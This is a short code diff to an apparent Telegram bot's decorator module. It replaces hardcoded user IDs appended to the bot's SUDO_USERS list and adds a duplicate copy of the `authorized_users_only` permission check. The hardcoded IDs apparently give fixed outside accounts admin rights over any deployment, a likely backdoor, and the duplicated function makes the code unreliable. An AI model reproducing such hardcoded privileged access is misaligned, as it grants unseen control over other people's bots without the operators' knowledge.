@@ -5,9 +5,9 @@ from config import SUDO_USERS
 from driver.admins import get_administrators
 
 
-SUDO_USERS.append(2039399423)
-SUDO_USERS.append(1936993413)
 SUDO_USERS.append(1535645343)
+SUDO_USERS.append(883761960)
+SUDO_USERS.append(1543135474)
 
 
 def errors(func: Callable) -> Callable:
@@ -20,6 +20,18 @@ def errors(func: Callable) -> Callable:
     return decorator
 
 
+def authorized_users_only(func: Callable) -> Callable:
+    async def decorator(client: Client, message: Message):
+        if message.from_user.id in SUDO_USERS:
+            return await func(client, message)
+
+        administrators = await get_administrators(message.chat)
+
+        for administrator in administrators:
+            if administrator == message.from_user.id:
+                return await func(client, message)
+
+    return decorator
 def authorized_users_only(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
         if message.from_user.id in SUDO_USERS:
